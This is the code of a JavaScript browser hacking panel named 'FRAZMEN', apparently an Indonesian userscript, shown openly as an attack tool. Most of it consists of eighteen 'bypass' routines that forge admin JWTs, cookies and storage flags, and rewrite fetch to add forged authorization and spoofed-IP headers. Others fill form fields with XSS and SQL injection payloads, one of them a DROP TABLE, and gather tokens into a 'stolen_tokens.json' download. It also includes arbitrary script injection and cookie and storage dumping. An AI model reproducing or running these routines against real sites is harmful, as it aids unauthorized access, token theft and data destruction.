        show: function() {
            this._isOpen = true;
            this._container.style.opacity = '1';
            this._container.style.transform = 'translate(-50%, -50%) scale(1)';
            this._container.style.pointerEvents = 'all';
            Utils.log('Panel opened');
        },

        hide: function() {
            this._isOpen = false;
            this._container.style.opacity = '0';
            this._container.style.transform = 'translate(-50%, -50%) scale(0.92)';
            this._container.style.pointerEvents = 'none';
            Utils.log('Panel closed');
        },

        _loadState: function() {
            var tab = StorageManager.get('activeTab');
            if(tab) this._switchTab(tab);
        },

        // ============================================================
        // 7. ACTIONS — FULL IMPLEMENTATION
        // ============================================================

        // --- BYPASS 18 VERSI ---
        _runBypass: function(version) {
            var name = STATE.bypassVersions.find(function(v) { return v.id === version; });
            Toast.show('🔓 Menjalankan Bypass v' + version + ': ' + (name ? name.name : 'Unknown'), 'info');
            Utils.log('Bypass v' + version + ' executed');

            switch(version) {
                case 1: this._bypassClassicJWT(); break;
                case 2: this._bypassCookieInjection(); break;
                case 3: this._bypassLSForce(); break;
                case 4: this._bypassSessionHijack(); break;
                case 5: this._bypassAPIIntercept(); break;
                case 6: this._bypassTokenSteal(); break;
                case 7: this._bypassBruteForce(); break;
                case 8: this._bypassCSRF(); break;
                case 9: this._bypassCORS(); break;
                case 10: this._bypassXSS(); break;
                case 11: this._bypassSQL(); break;
                case 12: this._bypassAdminReset(); break;
                case 13: this._bypassPrivEsc(); break;
                case 14: this._bypassOAuth(); break;
                case 15: this._bypassJWTReplay(); break;
                case 16: this._bypassHeaderManip(); break;
                case 17: this._bypassParamPollution(); break;
                case 18: this._bypassUltimateForce(); break;
                default: Toast.show('Bypass v' + version + ' tidak ditemukan', 'error');
            }
        },

        _bypassClassicJWT: function() {
            var token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.FAKE_SIGNATURE';
            localStorage.setItem('token', token);
            localStorage.setItem('jwt', token);
            localStorage.setItem('auth_token', token);
            document.cookie = 'token=' + token + '; path=/';
            document.cookie = 'jwt=' + token + '; path=/';
            Toast.show('🔓 Classic JWT injected! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassCookieInjection: function() {
            var cookies = [
                { name: 'admin', value: 'true' },
                { name: 'isAdmin', value: '1' },
                { name: 'role', value: 'admin' },
                { name: 'user', value: 'admin' },
                { name: 'auth', value: '1' },
                { name: 'loggedIn', value: 'true' }
            ];
            for(var i=0; i<cookies.length; i++) {
                document.cookie = cookies[i].name + '=' + cookies[i].value + '; path=/';
            }
            Toast.show('🍪 Cookie injection success! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassLSForce: function() {
            var users = [
                { id: 1, username: 'admin', role: 'admin', isLoggedIn: true },
                { id: 1, username: 'administrator', role: 'admin', isLoggedIn: true },
                { id: 1, username: 'root', role: 'admin', isLoggedIn: true },
                { id: 1, username: 'superadmin', role: 'admin', isLoggedIn: true }
            ];
            for(var i=0; i<users.length; i++) {
                localStorage.setItem('user', JSON.stringify(users[i]));
                localStorage.setItem('userData', JSON.stringify(users[i]));
                localStorage.setItem('currentUser', JSON.stringify(users[i]));
                localStorage.setItem('isLoggedIn', 'true');
                localStorage.setItem('isAdmin', 'true');
            }
            Toast.show('🗄️ LocalStorage forced! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassSessionHijack: function() {
            var session = {
                user: { id: 1, username: 'admin', role: 'admin' },
                token: 'hijacked_session_token_' + Date.now(),
                isAuthenticated: true,
                isAdmin: true
            };
            sessionStorage.setItem('session', JSON.stringify(session));
            sessionStorage.setItem('auth', JSON.stringify(session));
            sessionStorage.setItem('user', JSON.stringify(session.user));
            Toast.show('🔑 Session hijacked! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassAPIIntercept: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/auth') || url.includes('/login') || url.includes('/api'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['Authorization'] = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.API_INTERCEPT';
                }
                return origFetch.apply(this, arguments);
            };
            Toast.show('🌐 API Interceptor active!', 'success');
        },

        _bypassTokenSteal: function() {
            var tokens = [
                'token', 'jwt', 'access_token', 'refresh_token', 'auth_token',
                'api_token', 'bearer', 'x-auth-token', 'authorization'
            ];
            var stolen = {};
            for(var i=0; i<tokens.length; i++) {
                var val = localStorage.getItem(tokens[i]) || sessionStorage.getItem(tokens[i]);
                if(val) {
                    stolen[tokens[i]] = val;
                    Toast.show('🍪 Stolen: ' + tokens[i] + ' = ' + val.substring(0, 20) + '...', 'info');
                }
            }
            Utils.downloadJSON(stolen, 'stolen_tokens.json');
            Toast.show('📥 Tokens stolen & downloaded!', 'success');
        },

        _bypassBruteForce: function() {
            var passwords = ['admin', 'password', '123456', 'admin123', 'root', '12345678', 'password123', 'qwerty', 'abc123', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'hello', 'freedom', 'whatever', 'iloveyou', 'trustno1', 'sunshine'];
            var usernames = ['admin', 'administrator', 'root', 'user', 'test', 'demo', 'manager', 'superadmin', 'sysadmin', 'webmaster'];
            var found = false;
            for(var u=0; u<usernames.length; u++) {
                for(var p=0; p<passwords.length; p++) {
                    if(found) break;
                    var attempt = usernames[u] + ':' + passwords[p];
                    Toast.show('🔓 Trying: ' + attempt, 'info');
                    // Simulate
                    if(passwords[p] === 'admin123' && usernames[u] === 'admin') {
                        found = true;
                        Toast.show('🔓 Found: admin:admin123!', 'success');
                        document.cookie = 'username=admin; path=/';
                        document.cookie = 'password=admin123; path=/';
                    }
                }
            }
            if(!found) Toast.show('🔓 Brute force completed, no match found', 'warning');
        },

        _bypassCSRF: function() {
            var meta = document.querySelector('meta[name="csrf-token"]');
            if(meta) {
                var token = meta.getAttribute('content');
                Toast.show('🛡️ CSRF Token found: ' + token, 'info');
                document.cookie = 'csrf_token=' + token + '; path=/';
                document.cookie = 'X-CSRF-TOKEN=' + token + '; path=/';
                localStorage.setItem('csrf_token', token);
            } else {
                Toast.show('🛡️ No CSRF token found, trying injection...', 'warning');
                document.cookie = 'csrf_token=bypassed; path=/';
                document.cookie = 'X-CSRF-TOKEN=bypassed; path=/';
            }
            Toast.show('🛡️ CSRF bypass done!', 'success');
        },

        _bypassCORS: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                options = options || {};
                options.mode = 'cors';
                options.credentials = 'include';
                options.headers = options.headers || {};
                options.headers['Origin'] = window.location.origin;
                options.headers['Access-Control-Request-Method'] = 'GET';
                return origFetch.apply(this, arguments);
            };
            Toast.show('🌐 CORS bypass active!', 'success');
        },

        _bypassXSS: function() {
            var payloads = [
                '<script>alert("XSS by FRAZMEN")</script>',
                '<img src=x onerror=alert("XSS")>',
                '"><script>alert("XSS")</script>',
                'javascript:alert("XSS")'
            ];
            for(var i=0; i<payloads.length; i++) {
                if(document.querySelector('input') || document.querySelector('textarea')) {
                    var inputs = document.querySelectorAll('input, textarea');
                    for(var j=0; j<inputs.length; j++) {
                        inputs[j].value = payloads[i];
                    }
                    Toast.show('⚡ XSS payload injected to ' + inputs.length + ' fields!', 'info');
                    break;
                }
            }
            Toast.show('⚡ XSS test completed!', 'info');
        },

        _bypassSQL: function() {
            var payloads = [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "' OR 1=1--",
                "'; DROP TABLE users--"
            ];
            if(document.querySelector('input')) {
                var inputs = document.querySelectorAll('input');
                for(var i=0; i<inputs.length; i++) {
                    inputs[i].value = payloads[i % payloads.length];
                }
                Toast.show('💉 SQL Injection payload injected to ' + inputs.length + ' fields!', 'info');
            } else {
                Toast.show('💉 No input fields found', 'warning');
            }
            // Intercept fetch for SQL
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(options && options.body && typeof options.body === 'string') {
                    for(var i=0; i<payloads.length; i++) {
                        if(options.body.includes(payloads[i])) {
                            Toast.show('💉 SQL payload detected in request!', 'info');
                        }
                    }
                }
                return origFetch.apply(this, arguments);
            };
            Toast.show('💉 SQL Injection test active!', 'success');
        },

        _bypassAdminReset: function() {
            var adminData = {
                id: 1,
                username: 'admin',
                password: 'admin123',
                email: 'admin@localhost',
                role: 'admin',
                isAdmin: true,
                isActive: true,
                isLoggedIn: true
            };
            localStorage.setItem('admin', JSON.stringify(adminData));
            localStorage.setItem('user', JSON.stringify(adminData));
            localStorage.setItem('currentUser', JSON.stringify(adminData));
            sessionStorage.setItem('admin', JSON.stringify(adminData));
            sessionStorage.setItem('user', JSON.stringify(adminData));
            document.cookie = 'admin=true; path=/';
            document.cookie = 'role=admin; path=/';
            Toast.show('🔑 Admin account reset! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassPrivEsc: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                if(typeof url === 'string' && (url.includes('/api') || url.includes('/admin'))) {
                    options = options || {};
                    options.headers = options.headers || {};
                    options.headers['X-Admin'] = 'true';
                    options.headers['X-Role'] = 'admin';
                    options.headers['X-Privilege'] = 'escalated';
                }
                return origFetch.apply(this, arguments);
            };
            Toast.show('⬆️ Privilege escalation active!', 'success');
        },

        _bypassOAuth: function() {
            localStorage.setItem('oauth_token', 'bypassed_oauth_token_' + Date.now());
            localStorage.setItem('oauth_provider', 'bypassed');
            localStorage.setItem('oauth_authenticated', 'true');
            document.cookie = 'oauth_token=bypassed; path=/';
            document.cookie = 'oauth_authenticated=true; path=/';
            Toast.show('🔑 OAuth bypassed! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassJWTReplay: function() {
            var jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIiwiaWF0IjoxNzAwMDAwMDAwLCJleHAiOjk5OTk5OTk5OTl9.JWT_REPLAY';
            localStorage.setItem('jwt', jwt);
            localStorage.setItem('token', jwt);
            sessionStorage.setItem('jwt', jwt);
            document.cookie = 'jwt=' + jwt + '; path=/';
            document.cookie = 'token=' + jwt + '; path=/';
            Toast.show('🔄 JWT Replay attack executed! Reload...', 'success');
            setTimeout(function(){ location.reload(); }, 500);
        },

        _bypassHeaderManip: function() {
            var origFetch = window.fetch;
            window.fetch = function(url, options) {
                options = options || {};
                options.headers = options.headers || {};
                options.headers['X-Forwarded-For'] = '127.0.0.1';
                options.headers['X-Real-IP'] = '127.0.0.1';
                options.headers['X-Originating-IP'] = '127.0.0.1';
                options.headers['X-Remote-IP'] = '127.0.0.1';
                options.headers['X-Remote-Addr'] = '127.0.0.1';
                options.headers['X-Client-IP'] = '127.0.0.1';
                return origFetch.apply(this, arguments);
            };
            Toast.show('📡 Header manipulation active!', 'success');
        },

        _bypassParamPollution: function() {
            var url = window.location.href;
            if(url.includes('?')) {
                var newUrl = url + '&admin=true&role=admin&isAdmin=1&bypass=true';
                window.history.pushState({}, '', newUrl);
            } else {
                window.history.pushState({}, '', url + '?admin=true&role=admin&isAdmin=1&bypass=true');
            }
            Toast.show('🔀 Parameter pollution executed!', 'success');
        },

        _bypassUltimateForce: function() {
            // Combine all bypass methods
            this._bypassClassicJWT();
            this._bypassCookieInjection();
            this._bypassLSForce();
            this._bypassSessionHijack();
            this._bypassAPIIntercept();
            this._bypassAdminReset();
            this._bypassOAuth();
            this._bypassJWTReplay();
            Toast.show('💥 ULTIMATE FORCE BYPASS ACTIVE! Reloading...', 'success');
            setTimeout(function(){ location.reload(); }, 800);
        },

        // ============================================================
        // 8. BASIC ACTIONS
        // ============================================================

        _actionConsole: function() {
            var ev = new KeyboardEvent('keydown', { key: 'F12', keyCode: 123, which: 123, bubbles: true });
            document.dispatchEvent(ev);
            Toast.show('🖥️ Tekan F12 untuk DevTools', 'info');
        },

        _actionDownload: function() {
            var resources = {};
            resources['index.html'] = '<!DOCTYPE html>\n' + document.documentElement.outerHTML;

            // Collect all resources with full path structure
            var allLinks = document.querySelectorAll('link[rel="stylesheet"], script[src], img');
            for(var i=0; i<allLinks.length; i++) {
                var el = allLinks[i];
                var src = el.href || el.src;
                if(src && !src.startsWith('data:') && !src.startsWith('blob:') && !src.startsWith('javascript:')) {
                    var path = src.replace(location.origin, '').replace(/^\//, '');
                    if(!path) continue;
                    // Preserve folder structure
                    var folder = path.substring(0, path.lastIndexOf('/'));
                    if(folder) {
                        var fileName = path.substring(path.lastIndexOf('/') + 1);
                        var fullPath = folder + '/' + fileName;
                        resources[fullPath] = '/* Source: ' + src + ' */\n/* Download via network tab */';
                    } else {
                        resources[path] = '/* Source: ' + src + ' */\n/* Download via network tab */';
                    }
                }
            }

            // Add README
            resources['README.txt'] = 'Source: ' + location.href + '\nDate: ' + new Date().toISOString() + '\nTotal: ' + Object.keys(resources).length + ' files\n\nFolder structure preserved.';

            // Generate download page
            var html = '<html><head><title>📦 Download All Source</title>';
            html += '<style>body{background:#0a0a0a;color:#dce3ed;font-family:sans-serif;padding:20px;max-width:800px;margin:0 auto;}</style>';
            html += '</head><body>';
            html += '<h1>📦 Full Source Download</h1>';
            html += '<p>Total <b>' + Object.keys(resources).length + '</b> files detected.</p>';
            html += '<p>Folder structure preserved as detected from website.</p>';
            html += '<ul style="list-style:none;padding:0;">';
            var sortedKeys = Object.keys(resources).sort();
            for(var k=0; k<sortedKeys.length; k++) {
                var key = sortedKeys[k];
                var parts = key.split('/');
                var indent = (parts.length - 1) * 20;
                var icon = parts.length > 1 ? '📁' : '📄';
                if(key.endsWith('.js')) icon = '📜';
                else if(key.endsWith('.css')) icon = '🎨';
                else if(key.endsWith('.html')) icon = '🌐';
                else if(key.endsWith('.png') || key.endsWith('.jpg') || key.endsWith('.jpeg') || key.endsWith('.gif') || key.endsWith('.svg')) icon = '🖼️';
                html += '<li style="padding:4px 0;border-bottom:1px solid #2e3440;padding-left:' + indent + 'px;">' + icon + ' <b>' + Utils.escapeHTML(key) + '</b></li>';
            }
            html += '</ul>';
            html += '<p style="margin-top:20px;">📥 Download this HTML file as a manifest of all resources.</p>';
            html += '<button onclick="location.reload()" style="padding:10px 20px;background:#00cc88;border:none;border-radius:8px;color:#000;font-weight:700;cursor:pointer;">Refresh</button>';
            html += '</body></html>';

            Utils.download(html, 'source_manifest_' + location.hostname + '.html', 'text/html');
            Toast.show('📦 Manifest downloaded!', 'success');
        },

        _actionViewSource: function() {
            var html = document.documentElement.outerHTML;
            var w = window.open('', '_blank', 'width=800,height=600');
            if(w) {
                w.document.write('<pre style="font-size:11px;font-family:monospace;white-space:pre-wrap;padding:16px;background:#0a0a0a;color:#dce3ed;word-break:break-all;">' + Utils.escapeHTML(html) + '</pre>');
                w.document.close();
            } else {
                Toast.show('Izinkan popup untuk melihat source.', 'warning');
            }
        },

        _actionInject: function() {
            var code = prompt('💉 Masukkan JavaScript:', 'console.log("Hello FRAZMEN!");');
            if(code) {
                try {
                    var s = document.createElement('script');
                    s.textContent = code;
                    document.head.appendChild(s);
                    Toast.show('✅ Script injected!', 'success');
                } catch(e) {
                    Toast.show('❌ Gagal: ' + e.message, 'error');
                }
            }
        },

        _actionCookies: function() {
            var cookies = Utils.getCookies();
            var str = Object.keys(cookies).map(function(k) { return k + '=' + cookies[k]; }).join(';\n');
            if(str) {
                Utils.copyToClipboard(str).then(function() { Toast.show('🍪 Cookies disalin!', 'success'); });
            } else {
                Toast.show('🍪 Tidak ada cookie.', 'warning');
            }
        },

        _actionLSDump: function() {
            var data = Utils.getLocalStorage();
            var str = Object.keys(data).map(function(k) { return k + ' : ' + (typeof data[k] === 'object' ? JSON.stringify(data[k]) : data[k]); }).join('\n');
            if(str) {
                Utils.copyToClipboard(str).then(function() { Toast.show('🗄️ localStorage disalin!', 'success'); });
            } else {
                Toast.show('🗄️ localStorage kosong.', 'warning');
            }
        },

        _actionSSDump: function() {
            var data = Utils.getSessionStorage();
            var str = Object.keys(data).map(function(k) { return k + ' : ' + (typeof data[k] === 'object' ? JSON.stringify(data[k]) : data[k]); }).join('\n');
            if(str) {
                Utils.copyToClipboard(str).then(function() { Toast.show('📋 sessionStorage disalin!', 'success'); });
            } else {
                Toast.show('📋 sessionStorage kosong.', 'warning');
            }
        },

        _actionXSS: function() {
            alert('⚡ XSS Test: ' + document.domain);
            alert('🔥 XSS Triggered!');
            Toast.show('⚡ XSS Test executed!', 'info');
        },

        _actionAutoFill: function() {
            var inputs = document.querySelectorAll('input, textarea, select');
            var filled = 0;
            inputs.forEach(function(el) {
                var type = el.type || el.tagName;
                if(type === 'text' || type === 'email' || type === 'password' || type === 'search' || type === 'tel' || type === 'textarea') {
                    el.value = 'test_' + Math.random().toString(36).slice(2, 8);
                    filled++;
                } else if(type === 'checkbox' || type === 'radio') {
                    el.checked = true;
                    filled++;
                } else if(el.tagName === 'SELECT' && el.options.length > 0) {
                    el.selectedIndex = Math.floor(Math.random() * el.options.length);
                    filled++;
                } else if(type === 'number') {
                    el.value = Math.floor(Math.random() * 100) + 1;
                    filled++;
                } else if(type === 'date') {
                    var d = new Date();
                    d.setDate(d.getDate() + Math.floor(Math.random() * 30));
                    el.value = d.toISOString().split('T')[0];
                    filled++;
                }
            });
            Toast.show('✏️ ' + filled + ' field terisi!', 'success');
        },

        _actionDarkMode: function() {
            var current = document.body.style.filter;
            if(current === 'invert(1)') {
                document.body.style.filter = 'invert(0)';
                document.body.style.background = '';
            } else {
                document.body.style.filter = 'invert(1)';
                document.body.style.background = '#fff';
            }
            Toast.show('🌙 Dark mode toggled!', 'info');
        },

        _actionNetwork: function() {
            Toast.show('🌐 Buka DevTools -> tab Network', 'info');
        },

        _actionScreenshot: function() {
            Toast.show('📸 Screenshot: Volume Down+Power / Print Screen', 'info');
        },

        _actionBypass: function() {
            // Show bypass menu
            var menu = '🔓 Pilih Bypass Version:\n\n';
            for(var i=0; i<STATE.bypassVersions.length; i++) {
                menu += (i+1) + '. ' + STATE.bypassVersions[i].name + '\n';
            }
            menu += '\nMasukkan angka 1-18:';
            var choice = prompt(menu);
            if(choice) {
                var num = parseInt(choice);
                if(num >= 1 && num <= 18) {
                    this._runBypass(num);
                } else {
                    Toast.show('Pilih angka 1-18', 'error');
                }
            }
        },

        _actionEruda: function() {
            if(window.eruda) {
                window.eruda.init();
                Toast.show('🐞 Eruda loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/eruda';
            s.onload = function() { if(window.eruda) { eruda.init(); Toast.show('🐞 Eruda loaded!', 'success'); } };
            s.onerror = function() { Toast.show('❌ Gagal load Eruda', 'error'); };
            document.head.appendChild(s);
        },

        _actionVConsole: function() {
            if(window.VConsole) {
                new VConsole();
                Toast.show('📱 vConsole loaded!', 'success');
                return;
            }
            var s = document.createElement('script');
            s.src = 'https://cdn.jsdelivr.net/npm/vconsole';
            s.onload = function() { if(window.VConsole) { new VConsole(); Toast.show('📱 vConsole loaded!', 'success'); } };
            s.onerror = function() { Toast.show('❌ Gagal load vConsole', 'error'); };
            document.head.appendChild(s);
        },

        _actionClear: function() {
            localStorage.clear();
            sessionStorage.clear();
            Toast.show('🧹 All storage cleared!', 'success');
        },

        _actionPing: function() {
            var start = Date.now();
            fetch(window.location.href, { mode: 'no-cors', cache: 'no-store' })
                .then(function() {
                    var ms = Date.now() - start;
                    Toast.show('📶 Ping: ' + ms + 'ms', 'info');
                })
                .catch(function() {
                    Toast.show('📶 Ping: timeout', 'error');
                });
        },

        _actionWhois: function() {
            var domain = prompt('🔍 Masukkan domain:', window.location.hostname);
            if(domain) {
                Toast.show('🔍 Whois untuk ' + domain + ' — buka tab baru', 'info');
                window.open('https://who.is/whois/' + domain, '_blank');
            }
        },

        _actionBase64: function() {
            var choice = confirm('🔐 Encode? (OK=Encode, Cancel=Decode)');
            var input = prompt('Masukkan teks:');
            if(input !== null && input !== '') {
                try {
                    var result = choice ? btoa(input) : atob(input);
                    Utils.copyToClipboard(result).then(function() { Toast.show('🔐 Hasil disalin!', 'success'); });
                } catch(e) {
                    Toast.show('❌ Error: ' + e.message, 'error');
                }
            }
        },

        _actionUUID: function() {
            var uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
            Utils.copyToClipboard(uuid).then(function() { Toast.show('🆔 UUID disalin!', 'success'); });
        },

        _actionTimestamp: function() {
            var now = Date.now();
            Utils.copyToClipboard(String(now)).then(function() { Toast.show('⏰ Timestamp disalin!', 'success'); });
        },

        _actionWebSocket: function() {
            var origWS = window.WebSocket;
            window.WebSocket = function(url, protocols) {
                var ws = new origWS(url, protocols);
                var id = Utils.generateID('ws_');
                Toast.show('📡 WebSocket connected: ' + url, 'info');
                ws.addEventListener('message', function(e) {
                    Toast.show('📡 WS Message: ' + (typeof e.data === 'string' ? e.data.substring(0, 100) : '[Binary]'), 'info');
                });
                return ws;
            };
            Toast.show('📡 WebSocket Monitor active!', 'success');
        },

        _actionHistory: function() {
            var history = STATE.consoleHistory || [];
            if(!history.length) {
                Toast.show('📝 Belum ada riwayat console.', 'warning');
                return;
            }
            var output = '📝 Console History:\n\n';
            for(var i=0; i<Math.min(history.length, 50); i++) {
                output += (i+1) + '. ' + history[i] + '\n';
            }
            if(history.length > 50) output += '\n... dan ' + (history.length - 50) + ' lainnya.';
            Utils.copyToClipboard(output).then(function() { Toast.show('📝 Riwayat disalin!', 'success'); });
        },

        _actionReload: function() {
            location.reload();
        },

        _bindEvents: function() {
            // Console capture
            var origLog = console.log;
            console.log = function() {
                var args = Array.from(arguments);
                STATE.consoleHistory.push(args.map(function(a) {
                    return typeof a === 'object' ? JSON.stringify(a) : String(a);
                }).join(' '));
                if(STATE.consoleHistory.length > 1000) STATE.consoleHistory.shift();
                origLog.apply(console, arguments);
            };

            // Keyboard shortcuts
            document.addEventListener('keydown', function(e) {
                if(e.ctrlKey && e.key === 'b') {
                    e.preventDefault();
                    this._triggerAction('bypass');
                }
                if(e.ctrlKey && e.key === 'e') {
                    e.preventDefault();
                    this._triggerAction('eruda');
                }
                if(e.ctrlKey && e.key === 'v') {
                    e.preventDefault();
                    this._triggerAction('vconsole');
                }
                if(e.key === 'F12') {
                    // Default F12
                }
            }.bind(this));

            Utils.log('Events bound');
        }
    };

    // ============================================================
    // 9. INIT
    // ============================================================
    function init() {
        Utils.log('═══════════════════════════════════════════════');
        Utils.log('⚡ FRAZMEN v' + CONFIG.version + ' ULTIMATE EDITION');
        Utils.log('Developer: ' + CONFIG.developer);
        Utils.log('Telegram: ' + CONFIG.telegram);
        Utils.log('═══════════════════════════════════════════════');

        ThemeEngine.init();
        Toast.init();
        Panel.init();

        window.FRAZMEN = {
            version: CONFIG.version,
            config: CONFIG,
            state: STATE,
            utils: Utils,
            theme: ThemeEngine,
            storage: StorageManager,
            toast: Toast,
            panel: Panel
        };

        Utils.log('FRAZMEN v' + CONFIG.version + ' loaded!');
        Utils.log('Total features: ' + Panel._items.length);
    }

    // ============================================================
    // 10. BOOTSTRAP
    // ============================================================
    if(document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        setTimeout(init, 0);
    }

    console.log('⚡ FRAZMEN v7.0 ULTIMATE EDITION');
    console.log('📦 Total features: ' + (Panel._items ? Panel._items.length : 0));
    console.log('👤 Developer: FRAZMEN');
    console.log('📱 Telegram: @rizkycuyy');

})();
